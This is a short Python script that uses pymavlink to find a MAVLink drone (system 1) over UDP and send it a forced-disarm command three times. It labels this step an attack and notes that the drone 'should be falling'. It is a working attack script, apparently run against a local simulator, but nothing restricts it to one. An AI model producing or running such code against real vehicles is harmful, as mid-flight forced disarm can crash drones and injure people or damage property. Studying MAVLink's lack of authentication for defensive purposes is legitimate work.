import time
from pymavlink import mavutil

# 1. CONNECT (Use ’udp ’ to talk TO the drone)
# We use udp: localhost :14540 to target the standard PX4 offboard port.
connection = mavutil.mavlink_connection('udp:localhost:14550', source_system=255)

print(" Scanning for DRONE (System 1)")

# We loop and ignore any heartbeat that is NOT from System 1
while True:
    msg = connection.wait_heartbeat()
    sys_id = msg.get_srcSystem()

    if sys_id == 1:
        print(f" >> LOCKED ON: Drone found! (System {sys_id})")
        # Set the target to the drone
        connection.target_system = sys_id
        connection.target_component = msg.get_srcComponent()
        break
    else:
        print(f"Ignoring signal from System {sys_id} (Likely QGC)..")

print(f"Target Acuired: System {connection.target_system}, Component {connection.target_component}")

# 4. ATTACK
print("INJECTING DISARM COMMAND...")
for i in range(3):
    connection.mav.command_long_send(
        connection.target_system,
        connection.target_component,
        mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
        0,
        0,    # Param 1: 0 = Disarm
        21196, # Param 2: Force Disarm Magic Number
        0, 0, 0, 0, 0
    )
    time.sleep(0.1)

print(" Command Sent. Drone should be falling .")
